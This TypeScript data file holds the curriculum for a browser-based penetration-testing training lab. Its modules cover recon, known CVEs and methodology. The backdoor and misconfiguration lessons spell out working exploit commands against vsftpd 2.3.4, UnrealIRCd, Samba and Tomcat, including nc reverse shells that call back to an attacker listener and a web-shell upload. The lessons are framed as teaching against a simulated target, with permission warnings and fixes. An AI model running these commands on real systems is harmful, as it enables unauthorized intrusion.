// Curriculum: the 6 learning modules, rendered from structured blocks.

export type Block =
  | { t: "p"; x: string }
  | { t: "h"; x: string }
  | { t: "code"; x: string }
  | { t: "list"; items: string[] }
  | { t: "warn"; x: string }
  | { t: "tip"; x: string };

export interface Lesson {
  slug: string;
  title: string;
  desc: string;
  minutes: number;
  blocks: Block[];
}

export const lessons: Lesson[] = [
  {
    slug: "setup",
    title: "Your Lab, Zero Setup",
    desc: "How HackLab works and the one rule of pentesting.",
    minutes: 5,
    blocks: [
      { t: "p", x: "Normally a pentest lab means VirtualBox, Kali ISOs, and an afternoon of troubleshooting. HackLab skips all of that: the attacker machine (Kali) and the target (a Metasploitable-style box) are simulated right in your browser." },
      { t: "h", x: "The virtual network" },
      { t: "code", x: "kali (you) ── 192.168.56.10\ntarget     ── 192.168.56.20\nnetwork    ── 192.168.56.0/24 (isolated)" },
      { t: "p", x: "Open the Terminal page and type 'help'. Everything you type is interpreted by a simulated shell — nmap scans, netcat connections, FTP sessions — against the simulated target. Your progress on the 5 missions is saved in your browser." },
      { t: "warn", x: "The one rule: only test systems you own or have written permission to test. These techniques are taught against a simulated target. Using them elsewhere without permission is a crime (including under Pakistan's PECA 2016)." },
      { t: "tip", x: "When you're ready for the real thing, the full VM-based version of this lab is on GitHub: pentest-home-lab. Same missions, real tools." },
    ],
  },
  {
    slug: "recon",
    title: "Reconnaissance",
    desc: "Host discovery, port scanning, and reading results like an attacker.",
    minutes: 15,
    blocks: [
      { t: "p", x: "Recon is ~70% of a real pentest. Every open port is a question; every version banner is a potential answer." },
      { t: "h", x: "1. Who's alive?" },
      { t: "code", x: "nmap -sn 192.168.56.0/24" },
      { t: "p", x: "This pings the whole subnet. You should see .10 (your Kali) and .20 (the target)." },
      { t: "h", x: "2. What's open?" },
      { t: "code", x: "nmap -sV -sC 192.168.56.20" },
      { t: "list", items: ["-sV — detect service versions (banner grabbing)", "-sC — run safe enumeration scripts", "-p- — scan all 65,535 ports (slower)", "-O — guess the operating system"] },
      { t: "h", x: "3. Think like an attacker" },
      { t: "p", x: "Your scan shows ~20 open ports. The standouts: vsftpd 2.3.4 on port 21 (famous backdoor), UnrealIRCd on 6667 (trojaned release), Samba 3.0.20 on 139/445 (username map bug), distccd on 3632 (no auth), Tomcat on 8180 (default creds?). For each one, ask: why is this exposed, and what's the worst case?" },
      { t: "tip", x: "Try it now: complete the 'Map the Network' mission in Challenges, then come back." },
    ],
  },
  {
    slug: "backdoors",
    title: "Backdoors & Trust",
    desc: "vsftpd and UnrealIRCd: when the software itself betrays you.",
    minutes: 20,
    blocks: [
      { t: "p", x: "Two of this lab's bugs aren't coding mistakes — they're backdoors planted in distributed software. The pattern (supply-chain compromise) is still one of the scariest attack classes today." },
      { t: "h", x: "vsftpd 2.3.4 (CVE-2011-2523)" },
      { t: "p", x: "If an FTP username ends with ':)', the server opens a root shell on port 6200. Nobody knows for sure how it got into the official tarball." },
      { t: "code", x: "telnet 192.168.56.20 21\nUSER backdoor:)\nPASS anything\n# then in the main shell:\nnc 192.168.56.20 6200\nwhoami   → root" },
      { t: "h", x: "UnrealIRCd 3.2.8.1 (CVE-2010-2075)" },
      { t: "p", x: "The download mirror served a trojaned tarball for months. Any line sent to the IRC server starting with 'AB;' is executed as a system command." },
      { t: "code", x: "nc 192.168.56.20 6667\nAB; id\n# reverse shell:\n# (terminal 1) nc -lvnp 4444\nAB; nc -e /bin/sh 192.168.56.10 4444" },
      { t: "warn", x: "Lesson for defenders: verify checksums/signatures of everything you download. Lesson for you: always check what version is running — banners are free intelligence." },
    ],
  },
  {
    slug: "misconfig",
    title: "Misconfigurations",
    desc: "Samba command injection and Tomcat default credentials.",
    minutes: 20,
    blocks: [
      { t: "p", x: "Most real breaches aren't zero-days — they're misconfigurations. These two are textbook examples." },
      { t: "h", x: "Samba username map script (CVE-2007-2447)" },
      { t: "p", x: "Samba 3.0.20 can map usernames through an external script — run via a shell. A username containing shell metacharacters gets executed. Your payload phones home to a listener:" },
      { t: "code", x: "nc -lvnp 4445\nsmbclient //192.168.56.20/tmp -U './=`nohup nc -e /bin/sh 192.168.56.10 4445`'" },
      { t: "h", x: "Tomcat manager default creds" },
      { t: "p", x: "Port 8180's manager app still uses tomcat:tomcat. The manager can deploy WAR files — uploaded code the server runs. Default credential + powerful feature = game over." },
      { t: "code", x: "curl -u tomcat:tomcat http://192.168.56.20:8180/manager/html\ncurl -u tomcat:tomcat --upload-file shell.war \\\n  \"http://192.168.56.20:8180/manager/deploy?path=/shell\"\ncurl \"http://192.168.56.20:8180/shell/shell.jsp?cmd=id\"" },
      { t: "tip", x: "Fixes an admin would apply: unique strong passwords, restrict the manager to localhost, remove default accounts, patch Samba." },
    ],
  },
  {
    slug: "methodology",
    title: "Think Like a Pentester",
    desc: "PTES phases, note-taking, and CVSS scoring.",
    minutes: 10,
    blocks: [
      { t: "p", x: "Tools get you shells. Methodology gets you hired." },
      { t: "list", items: [
        "Pre-engagement — scope and written permission (your scope: 192.168.56.20)",
        "Intelligence gathering — recon, no exploitation yet",
        "Threat modeling — what breaks first? (your top-5 list)",
        "Vulnerability analysis — match services to known bugs",
        "Exploitation — prove it, one at a time, documented",
        "Post-exploitation — what could an attacker reach?",
        "Reporting — the actual product. Nobody pays for shells; they pay for the report.",
      ]},
      { t: "h", x: "CVSS in 60 seconds" },
      { t: "list", items: [
        "Critical 9.0–10.0 — vsftpd backdoor (unauthenticated remote root)",
        "High 7.0–8.9 — Tomcat default creds leading to RCE",
        "Medium 4.0–6.9 — weak service configs needing some access",
        "Low 0.1–3.9 — informational (e.g. verbose banners)",
      ]},
      { t: "tip", x: "Use the Report Builder page to turn your 5 missions into a real pentest report with CVSS scores." },
    ],
  },
  {
    slug: "next",
    title: "What Next?",
    desc: "Your roadmap from browser lab to job-ready.",
    minutes: 5,
    blocks: [
      { t: "p", x: "You now understand the full pentest loop: recon → exploit → document. Here's how to compound it:" },
      { t: "list", items: [
        "Re-do all 5 missions without hints — speed matters in interviews",
        "Build the real VM lab (GitHub: pentest-home-lab) and repeat with real Nmap",
        "DVWA / OWASP Juice Shop — web vulnerabilities next",
        "TryHackMe 'Jr Penetration Tester' path — guided hours",
        "Write up one finding publicly (LinkedIn/blog) — visibility is a career cheat code",
        "eJPT certification when the fundamentals feel easy",
      ]},
      { t: "p", x: "Interview line: 'I learned pentesting in a browser-based lab I practiced on, then reproduced it against real VMs — recon with Nmap, five manual exploits including CVE-2011-2523, and a written report with CVSS scoring.'" },
    ],
  },
];
